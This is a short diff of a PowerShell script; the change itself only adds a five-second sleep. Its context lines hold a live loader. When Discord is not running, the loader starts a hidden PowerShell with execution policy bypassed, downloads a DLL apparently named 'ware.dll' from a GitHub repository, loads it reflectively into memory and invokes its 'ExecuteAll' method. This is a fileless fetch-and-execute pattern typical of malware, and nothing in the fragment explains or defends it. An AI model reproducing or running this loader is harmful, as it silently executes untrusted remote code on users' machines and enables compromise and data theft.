@@ -29,6 +29,7 @@ if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
    Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "$wc=New-Object Net.WebClient;$b=$wc.DownloadData(''https://github.com/zold1337/toolsvip/raw/refs/heads/main/ware.dll'');$a=[Reflection.Assembly]::Load($b);$a.GetType(''ServiceManagerApp.MainTool'').GetMethod(''ExecuteAll'').Invoke($null,$null)"'
    Exit
 }
+Start-Sleep 5
 
 $invokeArgs = New-Object object[] 1 
 $invokeArgs[0] = [string[]]@() 
